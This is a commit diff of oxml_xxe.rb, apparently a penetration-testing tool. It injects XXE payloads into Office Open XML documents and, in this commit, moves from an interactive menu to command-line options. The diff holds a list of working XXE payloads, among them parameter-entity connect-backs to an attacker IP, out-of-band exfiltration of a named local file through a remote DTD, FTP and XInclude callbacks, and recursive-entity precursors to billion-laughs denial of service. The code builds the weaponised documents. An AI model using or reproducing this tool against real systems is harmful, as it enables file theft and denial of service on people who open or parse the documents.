2636099e64369150ddc900d43ba431c63908fc7b
BuffaloWill <wvandevanter@gmail.com>
2015-03-11 17:23:33 -0400

    created non menu version, https://github.com/BuffaloWill/oxml_xxe/issues/7

--- oxml_xxe.rb
+++ oxml_xxe.rb
@@ -1,17 +1,46 @@
 # encoding: ASCII-8BIT
-
 require 'zipruby'
 require 'highline/import'
 require 'highline'
 require 'fileutils'
-require './helper'
+require 'optparse'
+require 'json'
 
-# Global variables, these can be hardcoded to save time
-@input_file = ""
-@ip = ""
-@payload_file = ""
-@port = ""
-@in = "\t"
+# import config @options
+@options = JSON.parse(File.read('./options.json'))
+
+OptionParser.new do |opts|
+	opts.banner = "Usage: oxml_xxe.rb [options]; \n\t-b or -s are required\n\n"
+
+	opts.on("-b", "--build", "Build XE Document") do |v|
+		@options["build"] = true
+	end
+	opts.on("-s", "--string", "String replace XE Document") do |v|
+		@options["string"] = true
+	end
+
+	opts.on("-fFILE", "--file=FILE", "docx/xlsx/pptx file to embed the string into") do |v|
+		@options["file"] = v
+	end
+	opts.on("-iIP", "--ip=IP", "Set connect back IP") do |v|
+		@options["ip"] = v
+	end
+	opts.on("-x", "--exfiltrate=EFILE", "The file to exfiltrate") do |v|
+		@options["exfiltrate"] = v
+	end	
+	opts.on("-p", "--print-payloads", "Print the available payloads") do |v|
+		@options["payload_list"] = true
+	end
+	opts.on('-h', '--help', 'Displays Help') do
+		puts opts
+		exit
+	end
+end.parse!
+
+if (@options["build"]==nil and @options["string"]==nil and @options["payload_list"]==nil)
+	puts "\n Usage: oxml_xxe.rb [options]; \n\t-b or -s are required; -h for help\n\n"
+	exit
+end
 
 # Keep the payloads organized
 def read_payloads()	
@@ -20,13 +49,23 @@ def read_payloads()
 	pl["vanilla_recursive"] = ['<!DOCTYPE root [<!ENTITY b "XE_SUCCESSFUL"><!ENTITY xxe "RECURSE &b;&b;&b;&b;">]>', "A recursive XML entity, precursor to billion laughs attack."]	
 	pl["vanilla_parameter"] = ['<!DOCTYPE root [<!ENTITY % xxe "test"> %xxe;]>>', "A simple parameter entity. This is useful to test if parameter entities are filtered."]
 	pl["vanilla_parameter_recursive"] = ['<!DOCTYPE root [<!ENTITY % a "PARAMETER"> <!ENTITY % b "RECURSIVE %a;"> %b;]>>', "Recursive parameter entity, precusor to parameter entity billion laughs"]
-	pl["parameter_connectback"] = ['<!DOCTYPE root [<!ENTITY % a SYSTEM "http://IP:PORT/b.dtd">%a;]>>', "Parameter Entity Connectback, the simplest connect back test."]
-	pl["dbl_parameter_connectback"] = ['<!DOCTYPE root [<!ENTITY % file SYSTEM "http://IP:PORT/a.html"><!ENTITY % a SYSTEM "http://IP:PORT/b.dtd">%a;]>>',"This implements an effective OOB technique. It needs to be paired with a vaid DTD on the server."]
-	pl["rc_parameter_connectback"] = ['<!DOCTYPE root [<!ENTITY % file SYSTEM "file://FILE"><!ENTITY % a SYSTEM "http://IP:PORT/b.dtd">%a;]>>',"The same OOB technique but retrieves a file. Again needs to be paired with a valid DTD on the server."]
-	pl["parameter_connectback_ftp"] = ['<!DOCTYPE root [<!ENTITY % a SYSTEM "ftp://IP:PORT/b.dtd">%a;]>>',"FTP connectback test."]
-	pl["xinclude_root"] = ['<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///IP:PORT/clown.html" parse="text"/></root>', "XInclude test"]
+	pl["parameter_connectback"] = ['<!DOCTYPE root [<!ENTITY % a SYSTEM "http://IP/b.dtd">%a;]>>', "Parameter Entity Connectback, the simplest connect back test."]
+	pl["dbl_parameter_connectback"] = ['<!DOCTYPE root [<!ENTITY % file SYSTEM "http://IP:PORT/a.html"><!ENTITY % a SYSTEM "http://IP/b.dtd">%a;]>>',"This implements an effective OOB technique. It needs to be paired with a vaid DTD on the server."]
+	pl["rc_parameter_connectback"] = ['<!DOCTYPE root [<!ENTITY % file SYSTEM "file://FILE"><!ENTITY % a SYSTEM "http://IP/b.dtd">%a;]>>',"The same OOB technique but retrieves a file. Again needs to be paired with a valid DTD on the server."]
+	pl["parameter_connectback_ftp"] = ['<!DOCTYPE root [<!ENTITY % a SYSTEM "ftp://IP/b.dtd">%a;]>>',"FTP connectback test."]
+	pl["xinclude_root"] = ['<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///IP/clown.html" parse="text"/></root>', "XInclude test"]
+	pl["public_document_def"] = ['<!DOCTYPE roottag PUBLIC "-//OXML//XXE//EN" "http://IP/clown?check">', "Some XML Parser will auto retrieve PUBLIC urls"]
 
 	return pl
+end
+
+# print the current payloads and exit
+if @options["payload_list"]
+	puts "PAYLOAD LIST"
+	read_payloads.each do |pload|
+		puts "#{pload[0]}: #{pload[1][1]} \n\t #{pload[1][0]}"
+	end
+	exit
 end
 
 # This method retrieves the payloads and allows the user to assign a payload
@@ -42,36 +81,26 @@ def select_payload
 				i = i +1
 				puts "#{i}. #{pload[1][1]} \n\t #{pload[1][0]}"				
 			end			
-			main
 			exit
 		end
 		ploads.each do |pload|
 			menu.choice pload[0] do payload = pload[1][0] end
 		end		
 	end
-	if payload =~ /IP/ and @ip.size == 0
-		@ip = ask("Payload Requires a connect back IP:")
-		payload = payload.gsub("IP",@ip)	
+	if payload =~ /IP/ and @options["ip"].size == 0
+		@options["ip"] = ask("Payload Requires a connect back IP:")
+		payload = payload.gsub("IP",@options["ip"])	
 	end
-	if payload =~ /FILE/ and @payload_file.size == 0
-		@file_payload = ask("Payload Requires a file to check for:")	
-		payload = payload.gsub("FILE",@file_payload)	
+	if payload =~ /FILE/ and @options["exfiltrate"].size == 0
+		@options["exfiltrate"] = ask("Payload Requires a file to check for:")	
+		payload = payload.gsub("FILE",@options["exfiltrate"])	
 	end
-	if payload =~ /PORT/ and @port.size == 0
-		@port = ask("Payload allows for connect back port to be specified:")	
-		payload = payload.gsub("PORT",@port)	
+	if payload =~ /PORT/ and @options["port"].size == 0
+		@options["port"] = ask("Payload allows for connect back port to be specified:")	
+		payload = payload.gsub("PORT",@options["port"])	
 	end
 	
 	return payload
-end
-
-# this does a simple substitution of the [X]XE into the document DOCTYPE.
-#	It also resets the xml from standalone "yes" to "no"
-def payload(document,payload)
-	# insert the payload, TODO this should be refactored
-	document = document.gsub('<?xml version="1.0" encoding="UTF-8"?>',"""<?xml version=\"1.0\" encoding=\"UTF-8\"?>#{payload.gsub('IP',@ip).gsub('PORT',@port).gsub('FILE',@payload_file)}""")	
-	document = document.gsub('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>',"""<?xml version=\"1.0\" encoding=\"UTF-8\"?>#{payload.gsub('IP',@ip).gsub('PORT',@port).gsub('FILE',@payload_file)}""")
-	return document
 end
 
 # Insert the payload into every XML document in the document
@@ -85,6 +114,7 @@ end
 def choose_file(docx)
 	fz = list_files(docx)
 	payload = select_payload
+
 	puts "|+| #{payload} selected"
 	choose do |menu|
 		menu.prompt = "Choose File to insert XXE into:"
@@ -96,81 +126,143 @@ def choose_file(docx)
 	end
 end
 
-
-# Allow the user to specify their input file
-def list_files_menu(string_replace)
-	if(@input_file.size > 0)
-		# TODO check if this exists
-		puts "|+| Using #{@input_file}"
-		if string_replace
-				find_string
-		else
-			choose_file(@input_file)
+# takes in a docx and returns a list of files
+def list_files(docx)
+	files = []
+	Zip::Archive.open(docx, Zip::CREATE) do |zipfile|
+		n = zipfile.num_files # gather entries
+    
+		n.times do |i|
+			entry_name = zipfile.get_name(i) # get entry name from archive
+			files.push(entry_name)
 		end
-	else
-		docx = ask("Please Enter Input File (Defaults to samples/sample.docx):")
-		if docx.downcase == "Q"
-			return
-		else
-			docx = @input_file.size == 0 ? docx : @input_file
-			docx = docx.size == 0 ? "./samples/sample.docx" : docx
-			@input_file = docx
+	end
+	return files
+end
+
+# The meat of the work:
+#	reads in the XML file, inserts XXE and then creates the new OXML
+def add_payload(name,payloadx)
+	document = ""
+	# Read in the XLSX and grab the document.xml
+	Zip::Archive.open(@options["file"], Zip::CREATE) do |zipfile|
+		zipfile.fopen(name) do |f|
+			document = f.read # read entry content
+		end
+	end
+	docx_xml = payload(document,payloadx)
+
+	# get file ext
+	ext = @options["file"].split(".").last
+	nname = "output_#{Time.now.to_i}_#{name.gsub(".","_").gsub("/","_")}"
+	rand_file = "./output/#{nname}.#{ext}"
+
+	puts "|+| Creating #{rand_file}"
+	FileUtils::copy_file(@options["file"],rand_file)
+	Zip::Archive.open(rand_file, Zip::CREATE) do |zipfile|
+		zipfile.add_or_replace_buffer(name,
+								  docx_xml)
+	end
+end
+
+# The string replacement functionality
+def find_string
+	payloadx = select_payload
 	
-			if string_replace
-				find_string
-			else
-				# check if file exists
-				if File.file?(docx)		
-					puts "|+| #{docx} Loaded\n"
-					choose_file(docx)
-				else
-					puts "|!| #{docx} cannot be found."
+	puts "|+| Checking for § in #{@options["file"]}..."
+
+	targets = []
+	Zip::Archive.open(@options["file"], Zip::CREATE) do |zipfile|
+		n = zipfile.num_files # gather entries
+    
+		n.times do |i|
+			nm = zipfile.get_name(i)
+			zipfile.fopen(nm) do |f|
+				document = f.read # read entry content
+				if document =~ /§/
+					puts "|+| Found § in #{nm}, replacing with &xxe;"
+					targets.push(nm)
 				end
 			end
 		end
 	end
-end
+	
+	if targets.size == 0 
+		puts "|-| Could not find § in document, please verify."
+		return
+	end
+	
+	targets.each do |target|
+		document = ""
+		# Read in the XLSX and grab the document.xml
+		Zip::Archive.open(@options["file"], Zip::CREATE) do |zipfile|
+			zipfile.fopen(target) do |f|
+				document = f.read # read entry content
+			end
+		end
+		docx_xml = payload(document,payloadx)
+		
+		# replace string
+		docx_xml = docx_xml.gsub("§","&xxe;")
 
-# have the user set global variables
-def set_globals
-	choose do |menu|
-		menu.prompt = "Set Global Variables (q to return):"
-		menu.choice "Set Connect Back IP" do
-			@ip = ask("IP:")
-		end
-		menu.choice "OXML File To Inject Into" do
-			@input_file = ask("Input File:")
-		end
-		menu.choice "Payload File to Exfiltrate" do
-			@payload_file = ask("Payload File:")
-		end
-		menu.choice "Connect Back Port" do
-			@port = ask("Port:")
-		end
-		menu.choice "Print Globals" do
-			puts "\t|+| IP: #{@ip}"
-			puts "\t|+| PORT: #{@port}"
-			puts "\t|+| INPUT FILE: #{@input_file}"
-			puts "\t|+| PAYLOAD FILE: #{@payload_file}"
-		end
-		menu.hidden "q" do
-			return
+		# get file ext
+		ext = @options["file"].split(".").last
+		nname = "#{Time.now.to_i}_#{target.gsub(".","_").gsub("/","_")}"
+		rand_file = "./output/#{nname}.#{ext}"
+
+		puts "|+| Creating #{rand_file}"
+		FileUtils::copy_file(@options["file"],rand_file)
+		Zip::Archive.open(rand_file, Zip::CREATE) do |zipfile|
+			zipfile.add_or_replace_buffer(target,
+									  docx_xml)
 		end
 	end
 end
 
-# The main menu
-def main
-	while(true)
-		puts "\n"
-		choose do |menu|
-			menu.prompt = "Select Options"
-			menu.choice "Build XE Document" do list_files_menu(false) end
-			menu.choice "Build XE Document and Replace Strings" do list_files_menu(true) end
-			menu.choice "Set Global Variables" do set_globals end
-			menu.choice "Quit" do exit end
+# this does a simple substitution of the [X]XE into the document DOCTYPE.
+#	It also resets the xml from standalone "yes" to "no"
+def payload(document,payload)
+	# insert the payload, TODO this should be refactored
+	document = document.gsub('<?xml version="1.0" encoding="UTF-8"?>',"""<?xml version=\"1.0\" encoding=\"UTF-8\"?>#{payload.gsub('IP',@options["ip"]).gsub('FILE',@options["exfiltrate"])}""")	
+	document = document.gsub('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>',"""<?xml version=\"1.0\" encoding=\"UTF-8\"?>#{payload.gsub('IP',@options["ip"]).gsub('FILE',@options["exfiltrate"])}""")
+	return document
+end
+
+def list_files_menu(string_replace)
+	if(@options["file"].size > 0)
+		if File.file?(@options["file"])
+			puts "|+| Using #{@options["file"]}"
+			if string_replace
+				find_string
+			else
+				choose_file(@options["file"])
+			end
+		end
+		exit
+	else
+		puts "|+| Using #{@options["file"]}"
+
+		# check if file exists
+		if File.file?(@options["file"])		
+			puts "|+| #{@options["file"]} Loaded\n"
+			choose_file(@options["file"])
+		else
+			puts "|!| #{@options["file"]} cannot be found. Set with -f or modify config.json"
+			exit
+		end
+
+		if string_replace
+			find_string
 		end
 	end
 end
 
-main
+if @options["build"]
+	list_files_menu(false)
+	exit
+end			
+
+if @options["string"]
+	list_files_menu(true)
+	exit
+end			
